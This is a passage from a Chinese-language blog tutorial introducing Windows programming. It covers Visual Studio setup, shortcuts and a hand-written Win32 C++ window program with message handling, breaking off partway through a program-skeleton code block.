<!DOCTYPE html><html lang="zh-CN"><head><script src="https://lib.sinaapp.com/js/jquery/1.7.2/jquery.min.js"></script><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2"><link rel="apple-touch-icon" sizes="180x180" href="/images/180-180.png"><link rel="icon" type="image/png" sizes="32x32" href="/images/32-32.png"><link rel="icon" type="image/png" sizes="16x16" href="/images/16-16.png"><link rel="mask-icon" href="/images/logo.svg" color="#222"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/pace-js@1/themes/blue/pace-theme-minimal.css"><script src="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/pace.min.js"></script><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"hammerzer.github.io",root:"/",scheme:"Gemini",version:"7.8.0",exturl:!1,sidebar:{position:"left",display:"post",padding:18,offset:12,onmobile:!1},copycode:{enable:!0,show_result:!0,style:"flat"},back2top:{enable:!0,sidebar:!0,scrollpercent:!0},bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!1,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:"valine",storage:!0,lazyload:!1,nav:null,activeClass:"valine"},algolia:{hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},path:"search.xml"}</script><meta name="description" content="CONTENT OUTLINE  Windows         〇、目录 学习windows编程 Windows编程基础知识 网络编程 网络编程进阶 网络编程实战 多线程 进程 文件操作"><meta property="og:type" content="article"><meta property="og:title" content="Windows快速入门"><meta property="og:url" content="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/index.html"><meta property="og:site_name" content="Moustache&#39;s Blog"><meta property="og:description" content="CONTENT OUTLINE  Windows         〇、目录 学习windows编程 Windows编程基础知识 网络编程 网络编程进阶 网络编程实战 多线程 进程 文件操作"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/1-1.png"><meta property="og:image" content="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/2-1.png"><meta property="og:image" content="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/2-2.png"><meta property="og:image" content="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/2-3.jpg"><meta property="og:image" content="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/3-1.png"><meta property="og:image" content="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/3-2.png"><meta property="og:image" content="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/5-1.png"><meta property="og:image" content="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/7-1.png"><meta property="og:image" content="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/7-2.png"><meta property="og:image" content="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/7-3.png"><meta property="og:image" content="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/8-1.png"><meta property="og:image" content="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/8-2.png"><meta property="og:image" content="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/8-3.png"><meta property="og:image" content="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/8-4.png"><meta property="og:image" content="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/8-5.png"><meta property="og:image" content="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/8-6.png"><meta property="og:image" content="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/9-1.png"><meta property="og:image" content="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/11-1.png"><meta property="og:image" content="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/11-2.png"><meta property="article:published_time" content="2024-06-05T02:50:10.000Z"><meta property="article:modified_time" content="2025-01-19T03:19:15.985Z"><meta property="article:author" content="Moustache"><meta property="article:tag" content="操作系统与框架"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/1-1.png"><link rel="canonical" href="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0,lang:"zh-CN"}</script><title>Windows快速入门 | Moustache's Blog</title><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript><link rel="alternate" href="/atom.xml" title="Moustache's Blog" type="application/atom+xml"></head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span><h1 class="site-title">Moustache's Blog</h1><span class="logo-line-after"><i></i></span></a><p class="site-subtitle" itemprop="description">小胡子的私人空间</p></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul id="menu" class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">36</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">79</span></a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div id="search-result"><div id="no-result"><i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></div></header><div class="reading-progress-bar"></div><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content post posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/180-180.png"><meta itemprop="name" content="Moustache"><meta itemprop="description" content="我是小胡子"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Moustache's Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Windows快速入门</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2024-06-05 10:50:10" itemprop="dateCreated datePublished" datetime="2024-06-05T10:50:10+08:00">2024-06-05</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2025-01-19 11:19:15" itemprop="dateModified" datetime="2025-01-19T11:19:15+08:00">2025-01-19</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CPP/" itemprop="url" rel="index"><span itemprop="name">CPP</span></a> </span></span><span id="/2024/06/05/windows-Quick-Start/" class="post-meta-item leancloud_visitors" data-flag-title="Windows快速入门" title="阅读次数"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="post-meta-item-text">阅读次数：</span> <span class="leancloud-visitors-count"></span> <span>℃</span> </span><span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="post-meta-item-text">阅读次数：</span> <span id="busuanzi_value_page_pv"></span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2024/06/05/windows-Quick-Start/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2024/06/05/windows-Quick-Start/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>109k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>1:39</span></span></div></header><div class="post-body" itemprop="articleBody"><h2 id="CONTENT-OUTLINE"><a href="#CONTENT-OUTLINE" class="headerlink" title="CONTENT OUTLINE"></a>CONTENT OUTLINE</h2><blockquote><p><span style="background:#ff0">Windows</span></p></blockquote><hr style="border:0;height:1px;background:#333;background-image:linear-gradient(to right,#ccc,#333,#ccc)"><hr style="border-top:1px dashed #8c8b8b;border-bottom:none"><h2 id="〇、目录"><a href="#〇、目录" class="headerlink" title="〇、目录"></a>〇、目录</h2><ol><li>学习windows编程</li><li>Windows编程基础知识</li><li>网络编程</li><li>网络编程进阶</li><li>网络编程实战</li><li>多线程</li><li>进程</li><li>文件操作</li></ol><br><span id="more"></span><h2 id="一-学习windows编程"><a href="#一-学习windows编程" class="headerlink" title="一 学习windows编程"></a>一 学习windows编程</h2><h3 id="1-windows编程是什么"><a href="#1-windows编程是什么" class="headerlink" title="1 windows编程是什么"></a>1 windows编程是什么</h3><ul><li><p>Windows程序设计：以C++类的形式封装了Windows API，并且包含一个应用程序框架，以减少应用程序开发人员的工作量。</p><ul><li>包含大量Windows句柄封装类和很多Windows的内建控件和组件的封装类。专心的考虑程序的逻辑，而不是这些每次编程都要重复的东西</li><li>但是由于是通用框架，没有最好的针对性</li></ul></li><li><p>C/C++编程：仅产生少量的机器语言以及不需要任何运行环境支持便能运行的高效率程序设计语言。依靠非常全面的运算符和多样的数据类型，可以轻易完成各种数据结构的构建，通过指针类型更可对内存直接寻址以及对硬件进行直接操作，因此既能够用于开发系统程序，也可用于开发应用软件。</p><br></li></ul><h3 id="2-为什么要学习windows编程"><a href="#2-为什么要学习windows编程" class="headerlink" title="2 为什么要学习windows编程"></a>2 为什么要学习windows编程</h3><ul><li><p>满足windows应用开发需求</p></li><li><p>满足外包开发需求：上位机 和 嵌入式设备结合</p></li><li><p>就业需要：今日头条 深信服 传统行业 360 安全行业</p></li><li><p>逆向/反外挂基础【汇编】</p><br></li></ul><h3 id="3-怎么学习windows编程"><a href="#3-怎么学习windows编程" class="headerlink" title="3 怎么学习windows编程"></a>3 怎么学习windows编程</h3><ul><li>掌握理论【1 C++面向对象思想和多态性，2 Windows消息循环】<code>msg</code> <code>loop</code> 窗口 网络 系统：进程和线程</li><li>学会查询文档</li><li>收藏这个网址：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/">https://docs.microsoft.com/zh-cn/*</a> 【微软】【英文文档】</li><li>参考教材：孙鑫的《深入理解VC++》 参考</li><li>参考教材2：范文庆《Windows API 开发详解 函数、接口、编程实例》</li></ul><br><h3 id="4-环境安装和快捷键"><a href="#4-环境安装和快捷键" class="headerlink" title="4 环境安装和快捷键"></a>4 环境安装和快捷键</h3><h4 id="4-1-环境安装"><a href="#4-1-环境安装" class="headerlink" title="4.1 环境安装"></a>4.1 环境安装</h4><p>工作负载环境的安装：【工具：获取工具和功能 -&gt; 使用C++的桌面开发】</p><p><img src="./1-1.png"></p><h4 id="4-2-VA安装及常用快捷键"><a href="#4-2-VA安装及常用快捷键" class="headerlink" title="4.2 VA安装及常用快捷键"></a>4.2 VA安装及常用快捷键</h4><blockquote><p>VS2022已经不需要VA</p></blockquote><p>常用快捷键</p><p>– ALT+G 调到定义</p><p>– ALT + SHIFT + F 查找所有引用</p><p>– ALT + 左箭头/右箭头 ：回退/前进</p><p>– 批量注释</p><br><h2 id="二-Windows编程基础知识"><a href="#二-Windows编程基础知识" class="headerlink" title="二 Windows编程基础知识"></a>二 Windows编程基础知识</h2><h3 id="2-1-完全手写第一个Win32窗口程序"><a href="#2-1-完全手写第一个Win32窗口程序" class="headerlink" title="2.1 完全手写第一个Win32窗口程序"></a>2.1 完全手写第一个Win32窗口程序</h3><blockquote><p>创建新项目：windows桌面应用程序【此处使用空项目】</p></blockquote><p>需要补充的点：</p><ul><li>windows中的“实例”，是诸如窗口、鼠标、键盘等等，”句柄“可以理解为是实例的标记。</li><li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-winmain">WinMain</a>/wWinMain，是Windows的入口函数</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//目的：win32窗口程序</span></span><br><span class="line"><span class="comment">//1 掌握C++ 面向对象思想 2 理解消息机制 3 多态性</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//更改项目属性-&gt;高级-&gt;字符集-&gt;多字节字符集</span></span><br><span class="line">LPCTSTR clsName = <span class="string">&quot;My&quot;</span>;<span class="comment">//LP:指针 C：const STR:string T:宽字节</span></span><br><span class="line">LPCTSTR msgName = <span class="string">&quot;欢迎学习&quot;</span>;<span class="comment">//【窗口名，创建时用】</span></span><br><span class="line"><span class="comment">//若不更改字符集，则需要显式说明宽字节</span></span><br><span class="line"><span class="comment">//LPCTSTR msgName = L&quot;欢迎学习&quot;;//L表明是后面是一个宽字节字符串，否则报错</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//回调函数的声明</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MyWinProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HWND hwnd,    <span class="comment">// handle to window 窗口</span></span></span></span><br><span class="line"><span class="params"><span class="function">    UINT uMsg,    <span class="comment">// message identifier 消息类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">    WPARAM wParam,  <span class="comment">// first message parameter word word16位参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPARAM lParam  <span class="comment">// second message parameter long</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现步骤:</span></span><br><span class="line"><span class="comment">// a 设计一个窗口类 b 注册窗口类 c创建窗口 d显示以及更新窗口 e 消息循环</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// WINAPI = __stdcall </span></span><br><span class="line"><span class="comment">// 相对于dos的main</span></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">    HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSTR     lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span>       nShowCmd</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//a 设计一个窗口类**************************</span></span><br><span class="line">    <span class="comment">// 1 定义和配置窗口对象</span></span><br><span class="line">    WNDCLASS wndcls;</span><br><span class="line">    <span class="comment">/*typedef struct tagWNDCLASSW</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        UINT        style;		//【使用默认值】</span></span><br><span class="line"><span class="comment">        WNDPROC     lpfnWndProc;//指向窗口过程的指针。 必须使用 CallWindowProc 函数调用窗口过程</span></span><br><span class="line"><span class="comment">        int         cbClsExtra; //要根据窗口类结构分配的额外字节数,系统将字节初始化为零</span></span><br><span class="line"><span class="comment">        int         cbWndExtra; //在窗口实例之后分配的额外字节数,系统将字节初始化为零</span></span><br><span class="line"><span class="comment">        HINSTANCE   hInstance;  //实例的句柄，该实例包含类的窗口过程</span></span><br><span class="line"><span class="comment">        HICON       hIcon;		//类图标的句柄。 此成员必须是图标资源的句柄。 如果此成员为 NULL，则系统会提供默认图标。</span></span><br><span class="line"><span class="comment">        HCURSOR     hCursor;	//类游标的句柄。此成员必须是游标资源的句柄。如果此成员为 NULL，则每当鼠标移动到应用程序的窗口中时，应用程序都必须显式设置光标形状</span></span><br><span class="line"><span class="comment">        HBRUSH      hbrBackground;//类背景画笔的句柄。 此成员可以是用于绘制背景的物理画笔的句柄，也可以是颜色值</span></span><br><span class="line"><span class="comment">        LPCWSTR     lpszMenuName; //类菜单的资源名称，该名称显示在资源文件中</span></span><br><span class="line"><span class="comment">        LPCWSTR     lpszClassName;//指向以 null 结尾的字符串的指针或 是原子</span></span><br><span class="line"><span class="comment">    &#125; WNDCLASSW*/</span></span><br><span class="line">    wndcls.cbClsExtra = <span class="literal">NULL</span>;</span><br><span class="line">    wndcls.cbWndExtra = <span class="literal">NULL</span>;</span><br><span class="line">    wndcls.hbrBackground = (HBRUSH)<span class="built_in">GetStockObject</span>(WHITE_BRUSH);</span><br><span class="line">    wndcls.hCursor = <span class="built_in">LoadCursor</span>(<span class="literal">NULL</span>, IDC_ARROW);<span class="comment">//第二参数为光标类型</span></span><br><span class="line">    wndcls.hIcon = <span class="built_in">LoadIcon</span>(<span class="literal">NULL</span>, IDI_APPLICATION);</span><br><span class="line">    wndcls.hInstance = hInstance;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义交互响应：回调函数</span></span><br><span class="line">    wndcls.lpfnWndProc = MyWinProc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义窗口代号</span></span><br><span class="line">    wndcls.lpszClassName = clsName;</span><br><span class="line">    wndcls.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    wndcls.style = CS_HREDRAW | CS_VREDRAW;<span class="comment">//具体函数见文档</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// b 注册窗口类**************************</span></span><br><span class="line">    <span class="built_in">RegisterClass</span>(&amp;wndcls);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//c 创建窗口 ***************************</span></span><br><span class="line">    HWND hwnd;</span><br><span class="line">    <span class="comment">//CreateWindowA(lpClassName, lpWindowName, dwStyle, x, y,nWidth, nHeight, hWndParent, hMenu, hInstance, lpParam)</span></span><br><span class="line">    hwnd = <span class="built_in">CreateWindow</span>(clsName, msgName, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//d 显示和刷新窗口**************************</span></span><br><span class="line">    <span class="built_in">ShowWindow</span>(hwnd, SW_SHOWNORMAL);</span><br><span class="line">    <span class="built_in">UpdateWindow</span>(hwnd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//e 消息循环 0**************************</span></span><br><span class="line">    MSG msg;</span><br><span class="line">    <span class="comment">//GetMessage只有在接收到WM_QUIT才会返回0</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//将消息放入消息队列</span></span><br><span class="line">        <span class="comment">//TranslateMessage翻译消息,如将按键消息转化为字符消息</span></span><br><span class="line">        <span class="comment">//TranslateMessage(&amp;msg);</span></span><br><span class="line">        <span class="comment">//DispatchMessage(&amp;msg);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> msg.wParam;<span class="comment">//指针类型</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回调函数定义</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MyWinProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HWND hwnd,    <span class="comment">// handle to window 窗口句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    UINT uMsg,    <span class="comment">// message identifier 消息类型【重要:鼠标、字符、按键消息...】</span></span></span></span><br><span class="line"><span class="params"><span class="function">    WPARAM wParam,  <span class="comment">// first message parameter word word16位参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPARAM lParam  <span class="comment">// second message parameter long</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    HDC hdc;</span><br><span class="line">    <span class="keyword">switch</span> (uMsg)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> WM_CHAR:<span class="comment">//字符消息【WM:windows message】</span></span><br><span class="line">        <span class="type">char</span> szChar[<span class="number">20</span>];</span><br><span class="line">        <span class="built_in">sprintf_s</span>(szChar, <span class="string">&quot;您刚按下了:%c&quot;</span>, wParam);<span class="comment">//安全拷贝函数</span></span><br><span class="line">        <span class="built_in">MessageBox</span>(hwnd, szChar, <span class="string">&quot;char&quot;</span>, <span class="literal">NULL</span>);<span class="comment">//在窗口打印</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> WM_LBUTTONDOWN:<span class="comment">//左键按下</span></span><br><span class="line">        <span class="built_in">MessageBox</span>(hwnd, <span class="string">&quot;检测到鼠标左键按下&quot;</span>, <span class="string">&quot;L-msg&quot;</span>, <span class="literal">NULL</span>);<span class="comment">//在窗口打印</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> WM_PAINT:<span class="comment">//重绘消息【如最大化最小化】</span></span><br><span class="line">        PAINTSTRUCT ps;</span><br><span class="line">        hdc = <span class="built_in">BeginPaint</span>(hwnd, &amp;ps);</span><br><span class="line">        <span class="built_in">TextOut</span>(hdc, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;重绘窗口！&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;重绘窗口！&quot;</span>));<span class="comment">//开始画</span></span><br><span class="line">        <span class="built_in">EndPaint</span>(hwnd, &amp;ps);</span><br><span class="line">        <span class="built_in">MessageBox</span>(hwnd, <span class="string">&quot;检测到重绘&quot;</span>, <span class="string">&quot;msg-重绘&quot;</span>, <span class="literal">NULL</span>);<span class="comment">//在窗口打印</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> WM_CLOSE:<span class="comment">//关闭消息</span></span><br><span class="line">        ret = <span class="built_in">MessageBox</span>(hwnd, <span class="string">&quot;是否直接结束？&quot;</span>, <span class="string">&quot;msg&quot;</span>, MB_YESNO);</span><br><span class="line">        <span class="keyword">if</span> (ret== IDYES)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DestroyWindow</span>(hwnd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> WM_DESTROY:<span class="comment">//毁灭消息</span></span><br><span class="line">        <span class="comment">//发送WM_QUIT使退出while循环</span></span><br><span class="line">        <span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">//break;</span></span><br><span class="line">        <span class="comment">//其他消息返回默认消息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd, uMsg, wParam, lParam);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>该程序运行出现功能缺失的问题，但无需过于关心。目前开发使用Qt、MFC。</p></blockquote><p>📋程序骨架</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">WinMain</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">// 设计窗口外观及交互响应，注册，申请专利</span></span><br><span class="line">  <span class="built_in">RegisterClass</span>(...)</span><br><span class="line">  <span class="comment">// 生产窗口</span></span><br><span class="line">  <span class="built_in">CreateWindow</span>(...)</span><br><span class="line">  <span class="comment">// 展示窗口</span></span><br><span class="line">  <span class="built_in">ShowWindow</span>(...)</span><br><span class="line">  <span class="comment">// 粉刷窗口</span></span><br><span class="line">  <span class="built_in">UpdateWindow</span>(...)</span><br><span class="line">  <span class="comment">// 进入消息循环</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">GetMessage</span>(...)) &#123;</span><br><span class="line">    <span class="comment">// 消息转换</span></span><br><span class="line">    <span class="built_in">TranslateMessage</span>(...);</span><br><span class="line">    <span class="comment">// 消息分发</span></span><br><span class="line">    <span class="built_in">DispatchMessage</span>(...);</span><br><span class="line">  &#125;</span><br><span 